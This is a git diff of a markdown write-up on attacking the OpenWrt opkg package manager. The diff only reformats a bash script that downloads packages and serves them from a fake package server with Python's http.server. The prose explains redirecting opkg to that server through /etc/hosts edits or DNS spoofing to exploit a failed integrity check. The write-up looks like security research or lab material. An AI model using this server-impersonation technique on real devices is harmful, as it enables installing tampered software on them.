@@ -81,7 +81,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 - After finding the architecture, we can write a script to host a server to mimic the server from which opkg fetch the files and checks its intergity(actually it fails here).
 
-`#!/bin/bash
+```
+#!/bin/bash
 set -e
 rm -rf downloads.openwrt.org/ attr_20170915-1_i386_pentium4.ipk releases/
 
@@ -139,7 +140,8 @@ wget https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packa
 mkdir -p releases/18.06.2/packages/i386_pentium4/packages/
 mv attr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
 mv libattr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
-sudo python3 -m http.server 80 --bind 0.0.0.0`
+sudo python3 -m http.server 80 --bind 0.0.0.0
+```
 
 - Above script, sets up a server and mimics as package server. But we should also configue the */etc/host* with our hosting ip. This only works when the opkg searchs for the package in the script's ip. There is also a another way to do without interacting or changes things in firmware, it is called DNS spoofing , which just redirects the request to our package server.
 
